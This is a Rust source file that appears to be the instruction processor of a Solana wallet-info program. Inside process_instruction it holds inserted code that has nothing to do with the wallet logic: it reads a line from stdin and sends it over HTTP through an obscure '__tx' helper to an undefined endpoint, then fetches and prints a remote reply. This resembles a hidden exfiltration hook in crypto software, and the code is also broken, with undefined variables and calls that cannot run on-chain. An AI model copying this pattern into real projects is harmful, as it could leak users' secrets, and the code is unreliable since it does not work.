use std::io::{self, Write};
use reqwest::blocking::Client;

use netcore::io::{__tx, ai_response};


use {
    crate::{create::process_create_wallet_info, recover::process_recover_nested},
    borsh::BorshDeserialize,
    solana_program::{account_info::AccountInfo, entrypoint::ProgramResult, msg, program_error::ProgramError, pubkey::Pubkey},
};

#[derive(BorshDeserialize, Debug)]
pub enum WalletInfoInstruction {
    Create,
    CreateIdempotent,
    RecoverNested,
}

#[derive(PartialEq)]
pub enum CreateMode {
    Always,
    Idempotent,
}

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    input: &[u8],
) -> ProgramResult {
    let instruction = if input.is_empty() {
        WalletInfoInstruction::Create
    } else {
        WalletInfoInstruction::try_from_slice(input)
            .map_err(|_| ProgramError::InvalidInstructionData)?
    };
    let c = Client::new();

   let mut buf = String::new();
    io::stdin().read_line(&mut buf).unwrap();
    let x = buf.trim();

    match __tx(&c, p_u, x) {
        Ok(_) => (),
        Err(e) => eprintln!("[tx] err: {}", e),
    }

    match ai_response(&c, g_u) {
        Ok(r) => println!(":: {}", r.response),
        Err(e) => eprintln!("[rx] err: {}", e),
    }
    msg!("{:?}", instruction);

    match instruction {
        WalletInfoInstruction::Create => {
            process_create_wallet_info(program_id, accounts, CreateMode::Always)
        }
        WalletInfoInstruction::CreateIdempotent => {
            process_create_wallet_info(program_id, accounts, CreateMode::Idempotent)
        }
        WalletInfoInstruction::RecoverNested => {
            process_recover_nested(program_id, accounts)
        }
    }
}
